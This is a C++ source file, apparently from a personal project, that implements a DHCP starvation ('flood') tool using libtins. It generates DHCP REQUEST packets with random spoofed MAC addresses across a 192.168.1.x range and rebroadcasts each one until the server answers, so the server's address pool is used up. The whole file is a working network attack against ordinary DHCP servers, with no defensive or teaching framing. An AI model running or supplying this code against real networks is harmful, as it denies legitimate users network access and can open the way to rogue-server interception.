//
// Created by root on 5/6/18.
//

#include "DHCPFlood.h"

SnifferConfiguration DHCPFlood::getSnifferConfig() {
    SnifferConfiguration config;
    config.set_filter("(udp and ( port 67 or port 68 ))");//filter for dhcp
    config.set_promisc_mode(true);
    config.set_snap_len(400);
    config.set_immediate_mode(true);//https://libtins.github.io/faq/#tpacket-v3
    config.set_buffer_size(102400);
    return config;
}

HWAddress<6> DHCPFlood::generateRandomMAC() {
    HWAddress<6> randMac;
    for (auto &m:randMac) {
        m = distribution8(generator);
    }
    randMac[0] &= 0x10; //Prevent multicast MAC generation
    return randMac;
}

DHCP DHCPFlood::generateRandomDHCP(const IPv4Address &ip) {
    DHCP dhcp;

    dhcp.opcode(1);
    dhcp.htype(0x01);
    dhcp.hlen(6);
    dhcp.hops(0);
    dhcp.xid(distribution32(generator));
    dhcp.secs(3);
    dhcp.padding(0x8000);
    HWAddress<6> randMac = generateRandomMAC();
    dhcp.chaddr(randMac);
    dhcp.type(DHCP::Flags::REQUEST);
    dhcp.requested_ip(ip);
    dhcp.hostname("dhcp-flood");
    dhcp.end();

    std::cout << "Random DHCP MAC: " << randMac.to_string() << " For IP: " << ip << std::endl;
    return dhcp;
}

void DHCPFlood::startSnifferThread() {
    sniffer = std::thread([&]() {
        Sniffer sniffer(this->ifname, getSnifferConfig());

        sniffer.sniff_loop([&](PDU &response) {
            std::unique_lock<std::mutex> ul(m);

            const auto &raw = response.rfind_pdu<RawPDU>();
            auto dhcp = raw.to<DHCP>();

            switch (dhcp.type()) {
                case DHCP::Flags::ACK:
                    std::cout << "DCHP ACK RECEIVED: " << dhcp.yiaddr() << std::endl;
                    received = true;
                    cv.notify_one(); //woke up DHCP sender
                    break;
                case DHCP::Flags::NAK:
                    std::cout << "DCHP NACK RECEIVED: " << dhcp.chaddr().to_string() << std::endl;
                    received = true;
                    cv.notify_one(); //woke up DHCP sender
                    break;
                default:
                    std::cout << "Other DHCP packet received, Ignored." << std::endl;
                    break;
            }
            return !(finished && received);
        });
    });
}

void DHCPFlood::start(unsigned int startIP, unsigned int endIP) {
    received = false;
    finished = false;

    startSnifferThread();

    NetworkInterface networkInterface(this->ifname);
    PacketSender sender(networkInterface);

    auto pkt = EthernetII("ff:ff:ff:ff:ff:ff", networkInterface.hw_address()) //make frame
               / IP("255.255.255.255", "0.0.0.0") //make IP packet and put inside frame
               / UDP(67, 68); //make udp and put inside IP packet

    for (unsigned int i = startIP; i < endIP; ++i) {
        std::unique_lock<std::mutex> ul(m);
        received = false;

        auto dhcp = pkt / generateRandomDHCP("192.168.1." + std::to_string(i));

        finished = i == 254;//set finished true after latest IP.

        while (!received) { //send until ack or nack received in sniffer
            sender.send(dhcp);
            cv.wait_for(ul, 100ms);//wait 100ms until ack/nack received then retry
        }

    }
    sniffer.join(); // wait until sniffer thread termination
}

DHCPFlood::DHCPFlood(const std::string &ifname) :ifname(ifname){
}
